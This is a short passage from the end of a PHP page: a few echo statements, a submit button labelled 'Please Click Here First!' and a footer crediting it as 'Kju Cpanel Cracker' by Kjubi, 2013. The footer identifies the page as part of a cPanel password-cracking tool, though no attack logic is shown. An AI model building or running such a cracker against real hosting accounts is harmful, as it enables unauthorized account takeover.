echo "<font color=red>$func</font></b>";
echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
echo '<td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Please Click Here First!">
    </td></tr>';
}
?><tr>

</table></form></center>
<center><br><br><b><div class="info">-=[ Kju Cpanel Cracker by <span class="gaya"><a href="http://facebook.com/thakjub1">Kjubi</a></span> ]=-</div> 
<div class="jaya">  &copy; 2013 Kjubi</div></center></b><br><br>

</body></html>